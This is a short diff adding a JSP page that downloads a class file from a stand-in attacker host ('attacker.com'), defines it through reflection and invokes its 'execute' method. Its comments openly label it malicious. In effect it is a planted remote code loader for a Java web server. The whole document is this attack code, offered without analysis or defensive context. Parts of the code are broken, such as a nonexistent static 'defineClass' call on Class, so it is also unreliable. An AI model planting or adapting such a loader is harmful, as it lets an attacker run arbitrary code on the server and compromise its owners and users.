@@ -1,0 +1,43 @@
+<%@ page import="java.io.*, java.net.*, java.lang.reflect.*" %>
+<%
+    try {
+        // Define the URL of the malicious class file (e.g., from an attacker-controlled server)
+        String classUrl = "http://attacker.com/malicious/Example.class";
+        
+        // Fetch the class bytes over HTTP
+        URL url = new URL(classUrl);
+        InputStream inputStream = url.openStream();
+        byte[] classBytes = new byte[inputStream.available()];
+        inputStream.read(classBytes);
+        inputStream.close();
+        
+        // Manually define the class from the bytes
+        Class<?> loadedClass = defineClassFromBytes("Example", classBytes);
+        
+        // Use reflection to create an instance of the malicious class
+        Object instance = loadedClass.getDeclaredConstructor().newInstance();
+        
+        // Invoke a potentially malicious method (e.g., "execute" could be a method that runs harmful code)
+        Method method = loadedClass.getDeclaredMethod("execute");
+        method.setAccessible(true);
+        method.invoke(instance);
+        
+        out.println("Malicious class loaded and method invoked.");
+    } catch (Exception e) {
+        e.printStackTrace();
+    }
+%>
+
+<%! 
+    // This method manually loads a class from byte array
+    public Class<?> defineClassFromBytes(String name, byte[] classData) {
+        try {
+            // Define the class using the byte data (no ClassLoader)
+            Method defineClassMethod = Class.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
+            defineClassMethod.setAccessible(true);
+            return (Class<?>) defineClassMethod.invoke(null, classData, 0, classData.length);
+        } catch (Exception e) {
+            throw new RuntimeException("Error defining class from byte array", e);
+        }
+    }
+%>
